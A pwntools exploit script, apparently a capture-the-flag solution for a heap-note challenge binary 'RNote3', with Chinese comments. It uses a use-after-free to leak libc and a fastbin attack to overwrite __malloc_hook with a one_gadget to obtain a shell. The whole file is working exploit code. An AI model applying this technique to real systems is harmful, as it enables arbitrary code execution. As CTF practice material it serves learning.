# -*- coding=utf-8 -*-
from pwn import *
import time

context.log_level = 'debug'

p = process("./RNote3",env={"PRELOAD":"./libc.so.6"})
libc = ELF("./libc.so.6")
elf = ELF("./libc.so.6")

def Add_note(title,size,content):
	time.sleep(0.1)
	p.sendline("1")
	p.recvuntil("please input title:")
	p.sendline(title)
	p.recvuntil("please input content size:")
	p.sendline(str(size))
	p.recvuntil("please input content:")
	p.sendline(content)	

def Show_note(title):
	p.sendline("2")
	p.recvuntil("please input note title:")
	p.sendline(title)
	

def Edit_note(title,content):
	p.sendline("3")
	p.recvuntil("please input note title:")
	p.sendline(title)
	p.recvuntil("please input new content:")
	p.sendline(content)

def Delete_note(title):
	p.sendline("4")
	p.recvuntil("please input note title:")
	p.sendline(title)


if __name__=='__main__':
	
	Add_note('1',0xf8,'aaa')
	Add_note('2',0xf8,'bbb')

	Show_note('1')


	Delete_note('c')  #此时free会将fd置零，同时i增加到31，所以不会讲note[0]置零，但是note[0]指向的title变为0了
	Show_note('\x00')  #匹配到note[0],之前被free，变成unsorted bin，content块的fd和bk指向main_arena，可以用于泄露libc地址

	p.recvuntil("note content: ")	
	libc_leak = u64(p.read(6).ljust(8,"\x00"))
	print "libc_leak: " + hex(libc_leak)

	libc_base = libc_leak - libc.symbols['__malloc_hook'] - 0x68

	print "libc_base: " + hex(libc_base)

	malloc_hook = p64(libc_base + libc.symbols['__malloc_hook']-0x23)

	Add_note('3',0xa0,'ddd')
	Add_note('4',0x68,'eee')
	Add_note('5',0x68,'fff')

	Show_note('4')

	Delete_note('c')#use after free
	

	Edit_note('\x00',malloc_hook) #修改note[4]的content块的fd指向malloc_hook附近的地址，后面继续分配两次，就可以分配到malloc_hook附近的地址上，fastbin attack
	
	gdb.attach(p)
	pause()

	Add_note('6',0x68,'f') #分配第一次
	
	one_gedget = 0x4526a

	Add_note('7',0x68,'a'*3+p64(libc_base+one_gedget)*2+p64(libc_base+0x846D0)) #分配第二次，分配到malloc_hook的地址周围，用one_gadget覆盖相应的指针

	p.sendline('1')  #触发malloc操作
	
	'''

	Add_note('A',0xf8,'aaa')
	Add_note('A',0xf8,'bbb')

	Delete_note('A')
	Delete_note('A')
	

	Add_note('A',0xf8,'ccc')
	gdb.attach(p)
	pause()	
	Delete_note('X')
	Show_note('\x00')

	'''
	p.interactive()
